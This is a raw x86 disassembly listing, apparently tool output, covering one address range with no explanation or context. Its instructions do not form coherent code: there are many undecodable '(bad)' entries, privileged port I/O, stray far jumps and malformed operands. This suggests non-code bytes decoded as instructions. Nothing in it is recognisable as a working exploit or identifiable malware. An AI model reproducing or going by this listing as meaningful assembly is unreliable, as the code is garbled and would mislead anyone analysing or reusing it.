  406287:	lea    edi,[eax]
  406289:	dec    esp
  40628a:	les    edx,FWORD PTR [ebx-0x1c]
  40628d:	fnclex 
  40628f:	icebp  
  406290:	call   0x57d4:0x8320c60a
  406297:	rcl    DWORD PTR [esi+0x74d7027c],0x76
  40629e:	mov    eax,ds:0xd3c15f4
  4062a3:	sub    esp,DWORD PTR [bx+si-0x72e8]
  4062a8:	jp     0x4062ae
  4062aa:	pop    esp
  4062ab:	push   cs
  4062ac:	arpl   WORD PTR [esi],si
  4062ae:	imul   edx,DWORD PTR [eax+0x2875bb69],0x9b25e534
  4062b8:	add    al,0x73
  4062ba:	test   BYTE PTR [ebp+0x49070f9a],0x17
  4062c1:	jecxz  0x406269
  4062c3:	out    dx,eax
  4062c4:	repz xchg edx,eax
  4062c6:	dec    esp
  4062c7:	or     esi,DWORD PTR [ebx]
  4062c9:	xchg   BYTE PTR [eax-0x7a],ah
  4062cc:	stos   DWORD PTR es:[edi],eax
  4062cd:	push   0x52bd2587
  4062d2:	in     al,0xbb
  4062d4:	adc    eax,0xa02330a3
  4062d9:	fdivr  st,st(0)
  4062db:	clc    
  4062dc:	mov    DWORD PTR [esi+0x4ff8249f],ecx
  4062e2:	jne    0x4062c8
  4062e4:	cmp    DWORD PTR [ebp+ebp*1-0x22],esp
  4062e8:	xchg   edx,eax
  4062e9:	jmp    0xa7c2e7c4
  4062ee:	mov    edx,0x8e57e1a3
  4062f3:	je     0x406310
  4062f5:	popa   
  4062f6:	popa   
  4062f7:	add    eax,0x3c689495
  4062fc:	push   es
  4062fd:	leave  
  4062fe:	leave  
  4062ff:	dec    edi
  406300:	icebp  
  406301:	push   esp
  406302:	xchg   ecx,esp
  406304:	addr16 mov bh,0xb0
  406307:	xchg   edi,eax
  406308:	push   es
  406309:	xchg   edx,eax
  40630a:	push   ecx
  40630b:	pop    ecx
  40630c:	xchg   edi,eax
  40630d:	push   es
  40630e:	cli    
  40630f:	adc    dl,BYTE PTR ds:0xc765ba7e
  406315:	out    dx,al
  406316:	mov    eax,ds:0x8257985f
  40631b:	inc    eax
  40631c:	jo     0x4062c7
  40631e:	jne    0x406316
  406320:	sti    
  406321:	mov    esi,0x4b646d4a
  406326:	call   0x4c2fde3f
  40632b:	and    BYTE PTR [eax],al
  40632d:	adc    eax,0x4b71db90
  406332:	jbe    0x4062d2
  406334:	pop    ebx
  406335:	or     al,0x90
  406337:	popa   
  406338:	(bad)  [ecx+0x256590ff]
  40633e:	(bad)  
  40633f:	imul   ebx,DWORD PTR [ebp-0x1e9922f0],0x47
  406346:	sahf   
  406347:	lods   eax,DWORD PTR ds:[esi]
  406348:	sbb    BYTE PTR [ecx+ecx*4-0x40],0x40
  40634d:	push   0xffffff9d
  40634f:	sar    BYTE PTR [ecx],0x9b
  406352:	xchg   esi,eax
  406353:	xor    al,0x8f
  406355:	inc    edi
  406356:	out    0xae,eax
  406358:	jp     0x4063a9
  40635a:	iret   
  40635b:	nop
  40635c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40635d:	mov    ss,WORD PTR [ebp+0x14]
  406360:	fwait
  406361:	dec    ebx
  406362:	stos   BYTE PTR es:[edi],al
  406363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406365:	dec    esi
  406366:	in     eax,0x10
  406368:	push   es
  406369:	pop    es
  40636a:	xchg   ebp,eax
  40636b:	adc    DWORD PTR [esi+0x24],esp
  40636e:	push   ss
  40636f:	aad    0x9a
  406371:	inc    ecx
  406372:	and    DWORD PTR [ebx+0x5f],ebx
  406375:	jmp    0x315b1018
  40637a:	dec    eax
  40637b:	and    al,0x10
  40637d:	mov    al,0x1
  40637f:	dec    ebp
  406380:	adc    bh,cl
  406382:	enter  0x8eb8,0x87
  406386:	out    0x6a,eax
  406388:	cmp    BYTE PTR [ebx+esi*4-0x16],dl
  40638c:	dec    edx
  40638d:	stos   BYTE PTR es:[edi],al
  40638e:	aad    0xdc
  406390:	adc    DWORD PTR [esi],ecx
  406392:	rcl    BYTE PTR [edi],1
  406394:	jns    0x4063e7
  406396:	bound  ebx,QWORD PTR [edx+0x4c20927d]
  40639c:	cli    
  40639d:	imul   eax,DWORD PTR [edi],0xffffff88
  4063a0:	mov    dh,ch
  4063a2:	or     BYTE PTR [esi],al
  4063a4:	jp     0x40639e
  4063a6:	stc    
  4063a7:	fdiv   st(4),st
  4063a9:	mov    dh,ch
  4063ab:	enter  0x9546,0x40
  4063af:	pop    ds
  4063b0:	push   edx
  4063b1:	jae    0x40639f
  4063b3:	in     eax,0x92
  4063b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063b6:	popf   
  4063b7:	mov    al,0x64
  4063b9:	mov    bh,0x90
  4063bb:	adc    ah,0xba
  4063be:	div    ah
  4063c0:	rep outs dx,DWORD PTR ds:[esi]
  4063c2:	add    eax,0xcbd1d5d6
  4063c7:	mov    ds:0x454adae4,eax
  4063cc:	push   esi
  4063cd:	add    cl,cl
  4063cf:	ret    
  4063d0:	jns    0x40639e
  4063d2:	bnd ret 
  4063d4:	idiv   BYTE PTR [esi]
  4063d6:	mov    dl,0x7d
  4063d8:	outs   dx,DWORD PTR ds:[esi]
  4063d9:	inc    eax
  4063da:	pop    edx
  4063db:	pop    ss
  4063dc:	cmp    BYTE PTR [ecx-0x4a99e31e],ch
  4063e2:	jne    0x4063e4
  4063e4:	mov    DWORD PTR [edx],ecx
  4063e6:	adc    eax,0x302adb41
  4063eb:	cli    
  4063ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063ed:	leave  
  4063ee:	retf   0x8f07
  4063f1:	test   BYTE PTR [esi+0x1d],al
  4063f4:	shl    BYTE PTR [edx-0x2dff74b0],0x4c
  4063fb:	sub    edx,eax
  4063fd:	xchg   ebp,eax
  4063fe:	xchg   DWORD PTR [ecx],ecx
  406400:	sub    BYTE PTR [ebx-0x5d],0x65
  406404:	or     dh,ch
  406406:	les    eax,FWORD PTR [ebx+0x31]
  406409:	mov    dh,0x36
  40640b:	jcxz   0x40640b
  40640e:	inc    ebx
  40640f:	inc    esi
  406410:	in     eax,dx
  406411:	push   es
  406412:	loopne 0x406478
  406414:	retf   0x5f9
  406417:	xchg   ecx,eax
  406418:	xchg   ebx,eax
  406419:	std    
  40641a:	and    BYTE PTR [edi+0x7cd45f04],ch
  406420:	fadd   DWORD PTR [ecx]
  406422:	ss push ecx
  406424:	shl    eax,cl
  406426:	pop    edi
  406427:	xchg   BYTE PTR [edi],bh
  406429:	inc    BYTE PTR [ebx+0x10]
  40642c:	lods   al,BYTE PTR ds:[esi]
  40642d:	nop
  40642e:	xor    bl,BYTE PTR [edi-0xf130ee6]
  406434:	sub    ebx,DWORD PTR [ecx+0x116a0e22]
  40643a:	sub    DWORD PTR [esp+edi*2],ebx
  40643d:	aaa    
  40643e:	into   
  40643f:	hlt    
  406440:	jmp    0x406445
  406442:	push   cs
  406443:	popf   
  406444:	xor    al,0xc6
  406446:	out    dx,al
  406447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406448:	pop    ds
  406449:	(bad)  
  40644a:	retf   
  40644b:	push   ds
  40644c:	aaa    
  40644d:	dec    esi
  40644e:	sbb    DWORD PTR [edx-0x4825f116],eax
  406454:	or     al,0xce
  406456:	or     DWORD PTR [ecx],ecx
  406458:	imul   edx,ebx,0x5c8d0fcc
  40645e:	imul   ebx,DWORD PTR [edx-0x3e],0x9a869613
  406465:	cld    
  406466:	pusha  
  406467:	sbb    ch,BYTE PTR [ebx-0x63]
  40646a:	jae    0x4063fc
  40646c:	arpl   WORD PTR [edx],di
  40646e:	aas    
  40646f:	sub    bl,BYTE PTR [edx]
  406471:	xor    ah,al
  406473:	or     edx,esp
  406475:	or     DWORD PTR [ebx-0x7e9d8956],ecx
  40647b:	mov    edi,0x1cd8510
  406480:	inc    edx
  406481:	sbb    BYTE PTR [eax],ch
  406483:	xchg   esp,eax
  406484:	in     al,0x3c
  406486:	jno    0x40640b
  406488:	sysret 
  40648a:	je     0x406457
  40648c:	pop    edi
  40648d:	into   
  40648e:	mov    bl,0xca
  406490:	scas   al,BYTE PTR es:[edi]
  406491:	arpl   WORD PTR [edx],ax
  406493:	and    ebp,0x4f659662
  406499:	push   esp
  40649a:	fdiv   QWORD PTR [ebx-0x6404797f]
  4064a0:	das    
  4064a1:	lock loope 0x4064fc
  4064a4:	inc    edx
  4064a5:	pop    edi
  4064a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064a7:	sti    
  4064a8:	cmp    edx,DWORD PTR [ebx+0x35c25372]
  4064ae:	iret   
  4064af:	mov    eax,0xec382386
  4064b4:	xor    ecx,DWORD PTR ds:0x2e3f6d83
  4064ba:	sbb    eax,0x25bddebe
  4064bf:	nop
  4064c0:	sub    eax,0xfce65f99
  4064c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064c7:	(bad)  
  4064c8:	pop    ebp
  4064c9:	cdq    
  4064ca:	jae    0x406476
  4064cc:	and    al,0x6d
  4064ce:	jp     0x4064a9
  4064d0:	sbb    BYTE PTR [ebp+0x956c26a],dl
  4064d6:	fidivr WORD PTR [ebx-0x75c6e5f2]
  4064dc:	cmp    BYTE PTR [edi+ebp*8],ch
  4064df:	inc    ebx
  4064e0:	mov    edx,0xb5bf6f36
  4064e5:	push   ebx
  4064e6:	xchg   ecx,eax
  4064e7:	out    dx,eax
  4064e8:	push   ss
  4064e9:	jle    0x4064fe
  4064eb:	push   esp
  4064ec:	fistp  QWORD PTR [edx-0xac32a7c]
  4064f2:	jbe    0x40647b
  4064f4:	popa   
  4064f5:	int3   
  4064f6:	lock mov al,ds:0x90ee9677
  4064fc:	jb     0x40655e
  4064fe:	xor    eax,esi
  406500:	add    esi,0xf434949f
  406506:	mov    BYTE PTR [esi+0x6a],ch
  406509:	cmp    DWORD PTR [ebx+0x5686e77c],eax
  40650f:	and    DWORD PTR [ebp+0xb24738f],0xac7e0941
  406519:	xor    DWORD PTR [edx],esi
  40651b:	rcl    edi,cl
  40651d:	les    eax,FWORD PTR [edi]
  40651f:	ret    
  406520:	rcl    DWORD PTR [ebp-0x1e],0x85
  406524:	int3   
  406525:	dec    edx
  406526:	cmp    ch,ch
  406528:	daa    
  406529:	jge    0x406522
  40652b:	dec    ebp
  40652c:	aam    0xaa
  40652e:	sub    eax,0xc731487e
  406533:	pop    edx
  406534:	push   edi
  406535:	add    BYTE PTR [esi-0x5d256af3],bl
  40653b:	pop    ss
  40653c:	dec    edi
  40653d:	(bad)  
  40653e:	xor    BYTE PTR [esp+0x44249b16],ah
  406545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406546:	adc    esi,DWORD PTR [eax+0x41a226a5]
  40654c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40654d:	or     BYTE PTR ds:0x408b3e17,0x32
  406554:	scas   al,BYTE PTR es:[edi]
  406555:	cmp    al,0xdf
  406557:	aaa    
  406558:	gs xchg esp,eax
  40655a:	call   0x6c14:0x9f706c96
  406561:	add    eax,0x3838dfb6
  406566:	xor    BYTE PTR [ebp+0x4a],0xfb
  40656a:	or     esp,DWORD PTR [esi-0x2b]
  40656d:	jge    0x40650e
  40656f:	(bad)  
  406570:	fild   WORD PTR [eax]
  406572:	shl    DWORD PTR [edx],0x15
  406575:	aaa    
  406576:	mov    DWORD PTR [edi-0x75],ebp
  406579:	loopne 0x4065d7
  40657b:	int3   
  40657c:	or     dl,BYTE PTR [ebp+0x75e78ad6]
  406582:	xor    ch,BYTE PTR [ebp-0xf]
  406585:	lahf   
  406586:	add    eax,0x954afa74
  40658b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40658c:	dec    edi
  40658d:	in     eax,dx
  40658e:	out    dx,al
  40658f:	loopne 0x40654a
  406591:	(bad)
  406596:	leave  
  406597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406598:	pop    ebx
  406599:	sahf   
  40659a:	fld    TBYTE PTR [eax]
  40659c:	repz into 
  40659e:	mov    ah,0x7f
  4065a0:	adc    al,0xa
  4065a2:	mov    ah,0x67
  4065a4:	(bad)  
  4065a5:	xlat   BYTE PTR ds:[ebx]
  4065a6:	xchg   edx,eax
  4065a7:	and    eax,0xbda48764
  4065ac:	mov    ds:0xf2589be8,eax
  4065b1:	ror    BYTE PTR [ecx-0x2d14a7e3],1
  4065b7:	add    al,0x29
  4065b9:	xchg   esp,eax
  4065ba:	mov    edi,0x151e61e3
  4065bf:	bnd jo 0x4065db
  4065c2:	xchg   edi,eax
  4065c3:	ins    BYTE PTR es:[edi],dx
  4065c4:	push   cs
  4065c5:	mov    ah,0x1c
  4065c7:	mov    WORD PTR [eax+0x26e8443],es
  4065cd:	sub    ah,al
  4065cf:	rcr    BYTE PTR [edx+0xb],cl
  4065d2:	cld    
  4065d3:	gs xor al,0xae
  4065d6:	cmp    BYTE PTR ds:0xff4cceee,0x22
  4065dd:	sub    ebp,DWORD PTR [eax+0x1b]
  4065e0:	mov    ds:0x3688157d,eax
  4065e5:	cmp    al,0x2e
  4065e7:	lods   al,BYTE PTR ds:[esi]
  4065e8:	pushf  
  4065e9:	in     eax,0xb9
  4065eb:	xchg   esi,eax
  4065ec:	test   ebp,esi
  4065ee:	ret    
  4065ef:	jmp    0x4a0cfa2d
  4065f4:	pop    ds
  4065f5:	jns    0x406668
  4065f7:	leave  
  4065f8:	shl    DWORD PTR [edx-0x506b72da],cl
  4065fe:	ret    
  4065ff:	mov    ?,WORD PTR [esi-0x80]
  406602:	jecxz  0x40658e
  406604:	shr    BYTE PTR [ecx-0x1c80d61c],0x44
  40660b:	jecxz  0x406594
  40660d:	sbb    BYTE PTR [esi-0x2837a1e8],ch
  406613:	dec    ecx
  406614:	ja     0x40668c
  406616:	add    DWORD PTR [edi],ebp
  406618:	das    
  406619:	add    ch,0x8c
  40661c:	dec    ecx
  40661d:	jecxz  0x40665e
  40661f:	push   cs
  406620:	jno    0x4065ec
  406622:	test   eax,0xd4ab742e
  406627:	repnz test DWORD PTR [ebp-0x2a795b59],0xa6262cbf
  406632:	fs dec eax
  406634:	push   esp
  406635:	push   ecx
  406636:	sub    eax,0x4427a923
  40663b:	aam    0x1
  40663d:	mov    al,es:0xaf51e502
  406643:	pop    ecx
  406644:	adc    ah,bl
  406646:	xlat   BYTE PTR ds:[ebx]
  406647:	scas   eax,DWORD PTR es:[edi]
  406648:	outs   dx,DWORD PTR ds:[esi]
  406649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40664a:	jbe    0x40664b
  40664c:	rcl    edx,cl
  40664e:	mov    edi,0xfde7d0b2
  406653:	cmp    dl,BYTE PTR [edx+0x45708e52]
  406659:	and    dl,BYTE PTR [eax]
  40665b:	adc    esi,DWORD PTR [ebx+edi*4-0x1ace1a70]
  406662:	cdq    
  406663:	xlat   BYTE PTR ds:[ebx]
  406664:	out    0x0,eax
  406666:	sbb    al,0xb1
  406668:	inc    ebp
  406669:	mov    ds:0x6ab7622e,al
  40666e:	enter  0x4107,0x6c
  406672:	jne    0x40665e
  406674:	push   esi
  406675:	adc    eax,0x4fb94b6f
  40667a:	and    eax,0x99dceed7
  40667f:	jae    0x40666a
  406681:	dec    ecx
  406682:	nop
  406683:	sbb    al,0xbe
  406685:	cdq    
  406686:	rcl    BYTE PTR [ebx-0x3d],0xf1
  40668a:	pop    ebx
  40668b:	add    DWORD PTR [ecx-0x37c1a217],esp
  406691:	inc    edi
  406692:	dec    eax
  406693:	jge    0x406653
  406695:	fsubr  DWORD PTR [ebx+esi*2+0x1d]
  406699:	ds add eax,0x573e47e1
  40669f:	mov    ebx,0xe2c4bba8
  4066a4:	sub    eax,0x16d019fb
  4066a9:	push   ebx
  4066aa:	cld    
  4066ab:	xchg   edi,eax
  4066ac:	in     al,0x9c
  4066ae:	xchg   BYTE PTR [esi+eiz*8],bl
  4066b1:	dec    ebx
  4066b2:	clc    
  4066b3:	xchg   esp,eax
  4066b4:	ins    BYTE PTR es:[edi],dx
  4066b5:	jge    0x4066dc
  4066b7:	dec    esi
  4066b8:	xor    ah,ah
  4066ba:	inc    eax
  4066bb:	jp     0x40664f
  4066bd:	sbb    eax,0x6795cf43
  4066c2:	push   ebp
  4066c3:	pop    esi
  4066c4:	test   al,0xa8
  4066c6:	cmp    al,0x9
  4066c8:	cmp    DWORD PTR [ebx-0x6e],0x57
  4066cc:	int3   
  4066cd:	jbe    0x40668f
  4066cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d0:	loop   0x406690
  4066d2:	jb     0x406747
  4066d4:	mul    BYTE PTR [ecx]
  4066d6:	pop    ss
  4066d7:	jl     0x4066be
  4066d9:	outs   dx,BYTE PTR ds:[esi]
  4066da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066db:	popf   
  4066dc:	jecxz  0x4066a5
  4066de:	stos   DWORD PTR es:[edi],eax
  4066df:	call   0x303:0x9fc19aca
  4066e6:	mov    edx,0xc1c90e58
  4066eb:	stc    
  4066ec:	(bad)  
  4066ed:	or     DWORD PTR [esi],ebp
  4066ef:	adc    BYTE PTR [ecx+0x34],0xb8
  4066f3:	loop   0x4066d0
  4066f5:	cs loope 0x406749
  4066f8:	fld    TBYTE PTR [ecx-0x1bc34df9]
  4066fe:	lea    ebp,[ebp+0x1f32576b]
  406704:	pop    eax
  406705:	scas   eax,DWORD PTR es:[edi]
  406706:	sbb    eax,0x5099a0d7
  40670b:	ss pop esi
  40670d:	and    BYTE PTR [ebx],dh
  40670f:	inc    ebp
  406710:	test   BYTE PTR [esp+eiz*8],0xc2
  406714:	mov    dl,0xb0
  406716:	mov    esp,0xb92a0c62
  40671b:	dec    edx
  40671c:	imul   eax,DWORD PTR [edi+eax*2+0x29],0x1d
  406721:	push   ecx
  406722:	mov    dl,0xe9
  406724:	lea    edi,[ebx]
  406726:	mov    ds:0x1787d457,eax
  40672b:	je     0x406736
  40672d:	aas    
  40672e:	pusha  
  40672f:	cmp    al,0x9d
  406731:	es gs jno 0x406736
  406735:	jae    0x406740
  406737:	mov    ebp,0x1636870b
  40673c:	je     0x4066da
  40673e:	repnz mov DWORD PTR [edi],0xe0e368da
  406745:	loopne 0x40676b
  406747:	cdq    
  406748:	or     al,0x7c
  40674a:	out    dx,eax
  40674b:	clc    
  40674c:	inc    ebp
  40674d:	(bad)  
  40674f:	xchg   esp,eax
  406750:	add    al,0x2c
  406752:	pop    esp
  406753:	mul    BYTE PTR [edx+eax*8+0x42]
  406757:	mov    bl,ch
  406759:	push   ebp
  40675a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40675b:	dec    esi
  40675c:	sbb    DWORD PTR [esi+0x14],ebx
  40675f:	jnp    0x406789
  406761:	cli    
  406762:	adc    al,0xd7
  406764:	inc    esi
  406765:	adc    ch,BYTE PTR [eax]
  406767:	repz aad 0x8f
  40676a:	imul   eax,esi,0x33b44764
  406770:	inc    esi
  406771:	sti    
  406772:	and    esp,DWORD PTR [ebx-0x2a4da653]
  406778:	xchg   ebp,eax
  406779:	es adc al,0x7f
  40677c:	xor    BYTE PTR [edx-0x65ed741b],ah
  406782:	sbb    al,0x43
  406784:	inc    esp
  406785:	cwde   
  406786:	call   0xdb310b85
  40678b:	mov    WORD PTR [edi+0x4cbf531f],?
  406791:	sbb    al,0xcf
  406793:	adc    edi,eax
  406795:	enter  0xe857,0x16
  406799:	push   cs
  40679a:	bound  ecx,QWORD PTR [esi+0x33370c42]
  4067a0:	push   es
  4067a1:	pop    esi
  4067a2:	inc    eax
  4067a3:	iret   
  4067a4:	cmp    al,0xd0
  4067a6:	cmp    bh,BYTE PTR [ecx]
  4067a8:	xor    esp,ebp
  4067aa:	jmp    FWORD PTR [edi-0x18127da]
  4067b0:	inc    edi
  4067b1:	(bad)  
  4067b2:	hlt    
  4067b3:	fnstcw WORD PTR [edx+0x0]
  4067b6:	or     eax,0xeead3a0
  4067bb:	pushf  
  4067bc:	jmp    FWORD PTR [edi+0x262ba6a0]
  4067c2:	push   edi
  4067c3:	dec    ecx
  4067c4:	mov    ecx,0x4489085c
  4067c9:	jmp    0xa071:0x444fea9e
  4067d0:	add    DWORD PTR [esi-0x10a18952],ebx
  4067d6:	push   ebp
  4067d7:	mov    esi,0x6cde01b8
  4067dc:	loope  0x406805
  4067de:	adc    ah,al
  4067e0:	test   al,0xf4
  4067e2:	pop    ss
  4067e3:	mov    esp,0x403fdfa5
  4067e8:	aam    0x4b
  4067ea:	das    
  4067eb:	lock sub ecx,DWORD PTR [eax+0x455e3c67]
  4067f2:	jns    0x406856
  4067f4:	inc    ebp
  4067f5:	or     al,0x74
  4067f7:	xchg   BYTE PTR [edi-0x7ad35543],al
  4067fd:	faddp  st(0),st
  4067ff:	xchg   esi,eax
  406800:	inc    edx
  406801:	jl     0x406862
  406803:	dec    esi
  406804:	push   ds
  406805:	cwde   
  406806:	cmp    eax,0xbd059fb2
  40680b:	add    dh,dh
  40680d:	loop   0x406868
  40680f:	and    al,0x9a
  406811:	sub    ah,dl
  406813:	add    BYTE PTR ds:0xe945a8c0,cl
  406819:	cmp    DWORD PTR gs:[edi+ebx*4-0x2d],esi
  40681e:	xor    bh,dh
  406820:	cdq    
  406821:	sub    dh,BYTE PTR [ebx+0x57]
  406824:	mov    ecx,0x86023d63
  406829:	loop   0x406829
  40682b:	pushf  
  40682c:	or     ebp,DWORD PTR [edi-0x5dcf0439]
  406832:	pusha  
  406833:	push   cs
  406834:	cld    
  406835:	xchg   ebx,eax
  406836:	les    esp,FWORD PTR [ebx-0x20]
  406839:	push   esp
  40683a:	js     0x4067c3
  40683c:	push   edi
  40683d:	and    ebx,DWORD PTR [edx+0x4ecb8316]
  406843:	out    dx,al
  406844:	scas   eax,DWORD PTR es:[edi]
  406845:	mov    eax,ds:0xfb6e2eed
  40684a:	sbb    eax,0x56df594
  40684f:	jle    0x4067e3
  406851:	jne    0x4067d4
  406853:	test   eax,0x1c7602dd
  406858:	icebp  
  406859:	rcl    DWORD PTR [edi+0x443903a4],cl
  40685f:	in     al,0x6c
  406861:	pop    ds
  406862:	daa    
  406863:	sbb    eax,0xb766c035
  406868:	pop    es
  406869:	imul   ebx,DWORD PTR [ebx-0x50],0xffffff95
  40686d:	or     DWORD PTR [eax],edi
  40686f:	aaa    
  406870:	lods   al,BYTE PTR ds:[esi]
  406871:	or     eax,0x71ccbbbe
  406876:	jne    0x40680a
  406878:	ret    0x24d6
  40687b:	aaa    
  40687c:	fiadd  DWORD PTR [esi+esi*8-0x63]
  406880:	retf   0x3eed
  406883:	sub    al,0xfd
  406885:	jmp    0xf93c:0x79707736
  40688c:	repz jae 0x40682e
  40688f:	mov    al,ds:0x7da06a6b
  406894:	cmp    eax,0x6b73c27f
  406899:	push   0xd0bca6d2
  40689e:	ins    BYTE PTR es:[edi],dx
  40689f:	and    al,0x80
  4068a1:	adc    dh,dl
  4068a3:	addr16 mov cl,0x9
  4068a6:	inc    esp
  4068a7:	cmp    al,0xdb
  4068a9:	jae    0x4068b1
  4068ab:	ret    0x27d1
  4068ae:	pop    ss
  4068af:	pop    edi
  4068b0:	inc    ebp
  4068b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068b2:	inc    ebx
  4068b3:	retf   
  4068b4:	jno    0x4068cf
  4068b6:	adc    al,cl
  4068b8:	jo     0x4068b5
  4068ba:	mov    al,0xe0
  4068bc:	xchg   esp,eax
  4068bd:	adc    al,0xfc
  4068bf:	es or  al,0x29
  4068c2:	fidivr WORD PTR [eax-0x5d]
  4068c5:	push   ds
  4068c6:	leave  
  4068c7:	cli    
  4068c8:	inc    esi
  4068c9:	lods   al,BYTE PTR ds:[esi]
  4068ca:	xor    BYTE PTR ss:[edi+ecx*4],0xcb
  4068cf:	cmp    BYTE PTR [eax+esi*1-0x1745abdc],bh
  4068d6:	dec    ebp
  4068d7:	cmp    ecx,DWORD PTR [ebx+ecx*1]
  4068da:	lods   al,BYTE PTR ds:[esi]
  4068db:	mov    ch,0xc1
  4068dd:	dec    eax
  4068de:	and    al,0x94
  4068e0:	add    al,0xc0
  4068e2:	stc    
  4068e3:	inc    edi
  4068e4:	jae    0x40688b
  4068e6:	cmp    BYTE PTR [edx],ch
  4068e8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4068ea:	ss cmp al,0x78
  4068ed:	iret   
  4068ee:	shr    DWORD PTR [eax],cl
  4068f0:	icebp  
  4068f1:	ficom  DWORD PTR [ecx+0xf]
  4068f4:	mov    BYTE PTR [ebx+0x7920839],dl
  4068fa:	and    esp,DWORD PTR [ebx+edi*1+0x2f27b559]
  406901:	push   ecx
  406902:	popf   
  406903:	repnz or edi,DWORD PTR [ebp-0x37]
  406907:	dec    BYTE PTR [edi+0x7e9c1df8]
  40690d:	jnp    0x4068ba
  40690f:	mov    ch,0x66
  406911:	pop    ss
  406912:	fld    st(2)
  406914:	aad    0x21
  406916:	mov    ch,0x37
  406918:	pop    esp
  406919:	adc    dl,bl
  40691b:	sbb    BYTE PTR [esi],0xb9
  40691e:	rcl    DWORD PTR [ecx],cl
  406920:	jmp    0x222aabbc
  406925:	mov    ds:0x7ef21945,eax
  40692a:	cmp    eax,0x2cd2dd6b
  40692f:	in     eax,dx
  406930:	xor    ch,BYTE PTR [edi-0x7eb482ae]
  406936:	mov    ah,0xc8
  406938:	cmc    
  406939:	shl    DWORD PTR [edx-0x1e00b200],0xbd
  406940:	sub    DWORD PTR [esi+0x0],edi
  406943:	add    ah,BYTE PTR [eax+0x59df0393]
  406949:	sbb    cl,bl
  40694b:	mov    bl,0xdc
  40694d:	sbb    DWORD PTR [ecx-0x61232b2d],eax
  406953:	lea    esp,[ebx-0x42]
  406956:	xchg   ebp,eax
  406957:	scas   al,BYTE PTR es:[edi]
  406958:	adc    ecx,DWORD PTR [ebx-0x1fbb1039]
  40695e:	dec    ecx
  40695f:	ror    BYTE PTR [eax-0x39205116],0x7d
  406966:	popf   
  406967:	test   BYTE PTR [ecx+ecx*1],bh
  40696a:	jb     0x4068fe
  40696c:	xchg   esp,eax
  40696d:	dec    ecx
  40696e:	dec    edi
  40696f:	jae    0x406935
  406971:	popa   
  406972:	mov    bh,0xa
  406974:	xchg   ebp,eax
  406975:	inc    esp
  406976:	push   0xa9226038
  40697b:	fdivp  st(3),st
  40697d:	adc    eax,0xe8dbf890
  406982:	test   DWORD PTR [ebp-0x7977eb0b],0x974790d7
  40698c:	sbb    al,0x7a
  40698e:	cmc    
  40698f:	pop    edi
  406990:	ss inc edx
  406992:	or     cl,0x94
  406995:	ret    
  406996:	xchg   ebp,eax
  406997:	(bad)  
  406998:	aad    0xce
  40699a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40699b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40699c:	xchg   esp,eax
  40699d:	ins    DWORD PTR es:[edi],dx
  40699e:	mov    dl,0x86
  4069a0:	test   BYTE PTR [edi-0x27],cl
  4069a3:	xor    cl,ch
  4069a5:	nop
  4069a6:	bound  esp,QWORD PTR [esi+0x1c]
  4069a9:	ss pop es
  4069ab:	mov    ds:0x2b7ee46c,al
  4069b0:	out    dx,eax
  4069b1:	mov    edi,esp
  4069b3:	(bad)  
  4069b4:	xor    eax,0x804f9e5a
  4069b9:	jmp    FWORD PTR [edx+0x49]
  4069bc:	out    dx,al
  4069bd:	mov    al,0x69
  4069bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069c0:	xor    DWORD PTR [edx-0x54],edi
  4069c3:	xchg   ebx,eax
  4069c4:	jo     0x4069fd
  4069c6:	push   0xe4f9223e
  4069cb:	inc    edi
  4069cc:	(bad)  
  4069cd:	cld    
  4069ce:	mov    al,ds:0x59b34f9b
  4069d3:	mov    bl,0x8b
  4069d5:	in     eax,0xc4
  4069d7:	div    DWORD PTR [edi]
  4069d9:	aas    
  4069da:	mov    al,BYTE PTR [eax-0x4e]
  4069dd:	push   cs
  4069de:	neg    DWORD PTR [ebx+0x639e4fa7]
  4069e4:	loope  0x4069f6
  4069e6:	cwde   
  4069e7:	out    0xb2,eax
  4069e9:	jne    0x40698f
  4069eb:	dec    esi
  4069ec:	stc    
  4069ed:	ja     0x4069d0
  4069ef:	jnp    0x406a59
  4069f1:	sbb    BYTE PTR [ebp-0x7d],bh
  4069f4:	mov    eax,ds:0x763a776b
  4069f9:	and    bh,BYTE PTR [ecx-0x2b]
  4069fc:	imul   eax,DWORD PTR ds:0xc123c71d,0x210f249c
  406a06:	add    DWORD PTR [eax+eax*1-0x5e],edx
  406a0a:	out    0xc8,eax
  406a0c:	and    DWORD PTR [eax+0x72c77a87],ecx
  406a12:	mov    ebx,0xfc445c4d
  406a17:	lds    esp,FWORD PTR [eax+eax*1]
  406a1a:	jno    0x406a14
  406a1c:	(bad)  
  406a1d:	arpl   si,ax
  406a1f:	scas   al,BYTE PTR es:[edi]
  406a20:	xor    eax,0x2ef9a6cd
  406a25:	mov    esi,0x6c93c87e
  406a2a:	std    
  406a2b:	dec    eax
  406a2c:	sub    edx,DWORD PTR [edi+ebx*8]
  406a2f:	addr16 (bad) 
  406a32:	pop    es
  406a33:	adc    al,0xe7
  406a35:	mov    bh,0xe
  406a37:	mul    DWORD PTR [ebx]
  406a39:	shr    BYTE PTR [edx-0x3e],cl
  406a3c:	ret    0xe8d7
  406a3f:	mov    bh,0x88
  406a41:	bound  ebp,QWORD PTR [ebx-0x8]
  406a44:	sbb    DWORD PTR [eax+0x19dda62],eax
